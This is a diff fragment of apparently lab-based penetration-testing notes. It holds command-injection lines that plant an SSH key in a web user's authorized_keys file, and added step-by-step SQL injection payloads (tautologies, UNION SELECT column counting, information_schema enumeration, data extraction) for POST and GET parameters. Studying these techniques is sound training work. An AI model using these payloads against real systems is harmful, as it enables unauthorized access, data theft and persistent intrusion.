@@ -128,19 +128,37 @@ cat /home/student/.ssh/id_rsa.pub
 ; echo "" > /var/www/.ssh/authorized_keys # Paste whole key into echo
 ; cat /var/www/.ssh/authorized_keys
 ----------------------------------------------------------------------------------------------------------------------
+### SQL INJECTION ###
 User enters tom' OR 1='1 in the name and pass fields.
 Truth Statement: tom ' OR 1='1
 Server-Side query executed would appear like this:
 SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
+    ### POST METHOD ###
+## STEP 1
+# Use to check if field is vulnerable / no sanitization   
+| <value> 'OR 1=1' | 
 
+## STEP 2
+# Number of columns with numbers
+| <value>' UNION SELECT 1,2,3,4,5 FROM information_schema.tables # |
 
+## STEP 3
+# Golden statement
+| <value>' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; # |
 
+## STEP 4
+#
+| <value>' UNION SELECT tireid,2,size,cost,5 FROM session.Tires # | 
 
+    ### GET METHOD ###
+## STEP 1
+| Selection=1 or 1=1 |
 
+## STEP 2
+| Selection=2 UNION SELECT 1,2,3 # | 
 
-
-
-
+## STEP 3
+| Selection=2 UNION SELECT 1,table_schema,table_name FROM information_schema.tables
 
 
 
